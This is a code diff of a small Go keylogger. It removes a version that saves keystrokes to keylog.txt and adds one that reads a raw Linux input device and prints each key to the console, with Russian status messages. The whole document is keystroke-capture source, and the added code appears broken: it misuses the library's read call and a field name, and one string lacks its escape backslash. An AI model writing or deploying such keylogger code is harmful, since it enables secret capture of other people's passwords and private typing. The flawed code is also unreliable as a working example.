@@ -2,47 +2,40 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"os"
 	"os/signal"
 	"syscall"
+	"time"
 
-	"github.com/MichaelGatesDev/keyboard"
+	"github.com/MarinX/keylogger"
 )
 
 func main() {
-	kb, err := keyboard.NewKeyboard()
+	dev := "/dev/input/eventX"
+	kl, err := keylogger.New(dev)
 	if err != nil {
-		fmt.Printf("Failed to initialize keyboard listener: %v\n", err)
-		return
+		log.Fatal(err)
 	}
-	file, err := os.Create("keylog.txt")
-	if err != nil {
-		fmt.Printf("Failed to create keylog file: %v\n", err)
-		return
-	}
-	defer file.Close()
-	err = kb.Start()
-	if err != nil {
-		fmt.Printf("Failed to start keyboard listener: %v\n", err)
-		return
-	}
+	defer kl.Close()
 
-	signalChan := make(chan os.Signal, 1)
-	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-signalChan
-		fmt.Println("\nStopping keylogger...")
-		kb.Stop()
-	}()
-	fmt.Println("Keylogger started. Press Ctrl+C to stop.")
+	done := make(chan os.Signal, 1)
+	signal.Notify(done, os.Interrupt, syscall.SIGTERM)
+
+	fmt.Println("Начало записи...")
+
 	for {
-		event := <-kb.Events
-		if event.Err != nil {
-			fmt.Printf("Failed to read keyboard event: %v\n", event.Err)
-			continue
+		event := kl.Read()
+		if event != nil {
+			fmt.Printf("Нажата клавиша: %s\n", event.KeyString)
 		}
-		if event.Kind == keyboard.KeyRelease {
-			file.WriteString(fmt.Sprintf("%s\n", event.Key))
+
+		select {
+		case <-done:
+			fmt.Println("nЗавершение...")
+			time.Sleep(1 * time.Second)
+			return
+		default:
 		}
 	}
 }
